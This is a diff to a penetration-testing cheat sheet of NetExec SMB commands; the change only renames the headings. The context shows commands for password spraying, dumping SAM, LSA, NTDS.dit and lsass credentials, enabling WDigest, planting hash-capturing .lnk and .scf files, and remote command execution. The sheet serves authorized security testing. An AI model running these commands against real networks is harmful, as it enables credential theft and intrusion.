@@ -14,63 +14,63 @@ https://mpgn.gitbook.io/netexec/
 nxc smb <ip_range>
 ```
 
-## enumerate password policy
+## smb - enumerate password policy
 #plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
 
 ```bash
 nxc smb <ip> -u <user> -p '<password>' --pass-pol
 ```
 
-## enumerate null session
+## smb - enumerate null session
 #plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/CONNECT
 
 ```bash
 nxc smb <ip> -u '' -p ''
 ```
 
-## enumerate anonymous login
+## smb - enumerate anonymous login
 #plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/CONNECT
 
 ```bash
 nxc smb <ip> -u 'a' -p ''
 ```
 
-## enumerate active sessions
+## smb - enumerate active sessions
 #plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 
 
 ```bash
 nxc smb <ip> -u <user> -p '<password>' --sessions
 ```
 
-## enumerate domain users
+## smb - enumerate domain users
 #plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 
 
 ```bash
 nxc smb <ip> -u <user> -p '<password>' --users
 ```
 
-## enumerate local users by bruteforce the RID
+## smb - enumerate local users by bruteforce the RID
 #plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 
 
 ```bash
 nxc smb <ip> -u <user> -p '<password>' --rid-brute <max>
 ```
 
-## enumerate domain groups
+## smb - enumerate domain groups
 #plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 
 
 ```bash
 nxc smb <ip> -u <user> -p '<password>' --groups
 ```
 
-## enumerate local groups
+## smb - enumerate local groups
 #plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 
 
 ```bash
 nxc smb <ip> -u <user> -p '<password>' --local-groups
 ```
 
-## enumerate shares
+## smb - enumerate shares
 #plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 
 
 Enumerate permissions on all shares
@@ -79,13 +79,13 @@ Enumerate permissions on all shares
 nxc smb <ip> -u <user> -p <password> -d <domain_fqdn> --shares
 ```
 
-## spider shares
+## smb - spider shares
 #plateform/linux #target/remote #port/445 #protocol/smb #cat/RECON 
 ```bash
 nxc smb <ip> -u <user> -p '<password>' -M spider_plus
 ```
 
-## enumerate disks
+## smb - enumerate disks
 #plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 
 
 Enumerate disks on the remote target
@@ -94,7 +94,7 @@ Enumerate disks on the remote target
 nxc smb <ip> -u <user> -p '<password>' --disks
 ```
 
-## enumerate smb target not signed
+## smb - enumerate smb target not signed
 #plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
 
 Maps the network of live hosts and saves a list of only the hosts that  don't require SMB signing. List format is one IP per line
@@ -103,14 +103,14 @@ Maps the network of live hosts and saves a list of only the hosts that  don't re
 nxc smb <ip> --gen-relay-list smb_targets.txt
 ```
 
-## enumerate logged users
+## smb - enumerate logged users
 #plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 
 
 ```bash
 nxc smb <ip> -u <user> -p '<password>' --loggedon-users
 ```
 
-## enable wdigest
+## smb - enable wdigest
 #plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT  #warning/modify_target 
 
 enable/disable the WDigest provider and dump clear-text credentials from LSA memory.
@@ -119,7 +119,7 @@ enable/disable the WDigest provider and dump clear-text credentials from LSA mem
 nxc smb <ip> -u <user|Administrator> -p '<password>' --local-auth --wdigest enable
 ```
 
-## loggout user
+## smb - loggout user
 #plateform/linux #target/remote #port/445 #port/139 #protocol/smb #warning/modify_target #cat/POSTEXPLOIT
 
 Can be useful after enable wdigest to force user to reconnect
@@ -129,28 +129,28 @@ First use  -x 'quser'
 nxc smb <ip> -u <user> -p '<password>' -x 'logoff <id_user>' --no-output
 ```
 
-## local-auth
+## smb - local-auth
 #plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/CONNECT  
 
 ```bash
 nxc smb <ip> -u <user> -p <password> --local-auth
 ```
 
-## local-auth with hash
+## smb - local-auth with hash
 #plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/CONNECT 
 
 ```bash
 nxc smb <ip> -u <user> -H <nt_hash> --local-auth
 ```
 
-## domain auth
+## smb - domain auth
 #plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/CONNECT  
 
 ```bash
 nxc smb <ip> -u <user> -p <password> -d <domain_fqdn>
 ```
 
-## kerberos auth
+## smb - kerberos auth
 #plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/CONNECT 
 
 Previously import ticket : 
@@ -160,7 +160,7 @@ export KRB5CCNAME=<ccache>
 nxc smb <ip> --kerberos
 ```
 
-## Dump SAM
+## smb - Dump SAM
 #plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT/CREDS_RECOVER
 
 Dump SAM hashes using methods from secretsdump.py
@@ -170,7 +170,7 @@ You need at least local admin privilege on the remote target, use option --local
 nxc smb <ip> -u <user> -p <password> -d <domain_fqdn> --sam
 ```
 
-## Dump LSA
+## smb - Dump LSA
 #plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT/CREDS_RECOVER
 
 Dump LSA secrets using methods from secretsdump.py
@@ -180,7 +180,7 @@ Requires Domain Admin or Local Admin Privileges on target Domain Controller
 nxc smb <ip> -u <user> -p <password> -d <domain_fqdn> --lsa
 ```
 
-## dump ntds.dit
+## smb - dump ntds.dit
 #plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT/CREDS_RECOVER
 
 Dump the NTDS.dit from target DC using methods from secretsdump.py
@@ -190,28 +190,28 @@ Requires Domain Admin or Local Admin Privileges on target Domain Controller
 nxc smb <ip> -u <user> -p <password> -d <domain_fqdn> --ntds
 ```
 
-## dump lsass
+## smb - dump lsass
 #plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT/CREDS_RECOVER
 
 ```bash
 nxc smb <ip> -u <user> -p <password> -d <domain_fqdn> -M lsassy
 ```
 
-## dump lsass - with bloodhond update
+## smb - dump lsass - with bloodhond update
 #plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT/CREDS_RECOVER
 
 ```bash
 nxc smb <ip> --local-auth -u <user> -H <nt_hash> -M lsassy -o BLOODHOUND=True NEO4JUSER=<user|neo4j> NEO4JPASS=<neo4jpass|exegol4thewin>
 ```
 
-## password spray (user=password)
+## smb - password spray (user=password)
 #plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/BRUTEFORCE-SPRAY 
 
 ```bash
 nxc smb <dc_ip> -u <user.txt> -p <password.txt> --no-bruteforce --continue-on-success
 ```
 
-## password spray multiple test 
+## smb - password spray multiple test 
 #plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/BRUTEFORCE-SPRAY #tag/warning
 
 (carrefull on lockout)
@@ -220,7 +220,7 @@ nxc smb <dc_ip> -u <user.txt> -p <password.txt> --no-bruteforce --continue-on-su
 nxc smb <dc_ip> -u <user.txt> -p <password.txt> --continue-on-success
 ```
 
-## put file
+## smb - put file
 #plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/FILE_TRANSFERT 
 Send a local file to the remote target
 
@@ -228,7 +228,7 @@ Send a local file to the remote target
 nxc smb <ip> -u <user> -p <password> --put-file <local_file> <remote_path|\\Windows\\Temp\\target.txt>
 ```
 
-## get file
+## smb - get file
 #plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/FILE_TRANSFERT 
 Send a local file to the remote target
 
@@ -237,27 +237,27 @@ nxc smb <ip> -u <user> -p <password> --get-file <remote_path|\\Windows\\Temp\\ta
 ```
 
 
-## find vulnerable to petitpotam coerce 
+## smb - find vulnerable to petitpotam coerce 
 #plateform/linux #target/remote #port/445 #protocol/smb #cat/RECON 
 
 ```bash
 nxc smb <ip> -u <user> -p <password> -M PetitPotam
 ```
 
-## find runing WebDav clients (coerce over http)
+## smb - find runing WebDav clients (coerce over http)
 #plateform/linux #target/remote #port/445 #protocol/smb #cat/RECON 
 try to force WebDav to start  with -M drop-sc
 ```bash
 nxc smb <ip_range> -u <user> -p <passwd> -M webdav
 ```
 
-## Checking if the service spooler is running
+## smb - Checking if the service spooler is running
 #plateform/linux #target/remote #port/445 #protocol/smb #cat/RECON 
 ```bash
 nxc smb <ip_range> -u <user> -p <passwd> -M spooler
 ```
 
-## drop malicious ..searchConnector-ms file  (enable WebDav)
+## smb - drop malicious ..searchConnector-ms file  (enable WebDav)
 #plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/COERCE-FILE
 in every writable folder on the target server 
 	
@@ -280,7 +280,7 @@ xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
 nxc smb <ip_range> -u <user> -p <passwd> -M drop-sc 
 ```
 
-## drop an malicious .lnk file (hash farming)
+## smb - drop an malicious .lnk file (hash farming)
 #plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/COERCE-FILE
 in every writable folder on the target server 
 CLEANUP=true
@@ -290,7 +290,7 @@ nxc smb <ip> -u <user> -p <password> -M slinky -o NAME=<file_name> SERVER=<local
 ```
  
 
-## drop an malicious .scf file (hash farming)
+## smb - drop an malicious .scf file (hash farming)
 #plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/COERCE-FILE
 in every writable folder on the target server 
 CLEANUP=true
@@ -305,14 +305,14 @@ Command=ToggleDesktop
 nxc smb <ip> -u <user> -p <password> -M scufy -o NAME=<file_name> SERVER=<local_ip>
 ```
  
-## execute command (cmd)
+## smb - execute command (cmd)
 #plateform/linux #target/remote #port/445 #port/139 #protocol/smb #warning/modify_target #cat/POSTEXPLOIT
 
 ```bash
 nxc smb <ip> -u <user> -p '<password>' -x '<command>' --no-output
 ```
  
-## execute command (powershell)
+## smb - execute command (powershell)
 #plateform/linux #target/remote #port/445 #port/139 #protocol/smb #warning/modify_target #cat/POSTEXPLOIT
 
 ```bash
